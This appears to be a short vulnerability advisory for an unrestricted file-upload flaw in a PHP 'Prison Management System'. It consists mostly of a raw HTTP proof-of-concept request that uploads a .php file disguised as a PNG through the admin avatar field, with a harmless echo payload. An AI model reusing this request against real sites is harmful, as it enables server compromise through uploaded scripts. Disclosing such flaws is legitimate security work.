1.Prison Management System File Upload

2.Description
The system Client doesn't properly sanitise POST parameter, which result into a File Upload.

3.Vendor Homepage 
https://www.sourcecodester.com/sql/17287/prison-management-system.html

4.Author will@webray.com.cn inc

5.Proof of Concept

(1)The request packet is as follows

POST /prison/Admin/add-admin.php HTTP/1.1

Host: 192.168.67.19

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0

Content-Type: multipart/form-data; boundary=---------------------------122164689239586784784260003750

Cookie: PHPSESSID=m2d2dle30rvjnncs2tdtn9c37e

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Origin: http://192.168.67.19

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Referer: http://192.168.67.19/prison/Admin/add-admin.php

Sec-GPC: 1

Content-Length: 4225


-----------------------------122164689239586784784260003750

Content-Disposition: form-data; name="txtusername"



-----------------------------122164689239586784784260003750

Content-Disposition: form-data; name="txtfullname"



-----------------------------122164689239586784784260003750

Content-Disposition: form-data; name="txtpassword"



-----------------------------122164689239586784784260003750

Content-Disposition: form-data; name="txtphone"



-----------------------------122164689239586784784260003750

Content-Disposition: form-data; name="avatar"; filename="a.php"

Content-Type: image/png


<?php echo('hello');?>

-----------------------------122164689239586784784260003750

Content-Disposition: form-data; name="btncreate"



-----------------------------122164689239586784784260003750--



(2)result

![image](https://github.com/MaiEmily/map/blob/master/public/image/20190528145810708.png)

![image](https://github.com/MaiEmily/map/blob/master/public/image/20190528145810708.png)
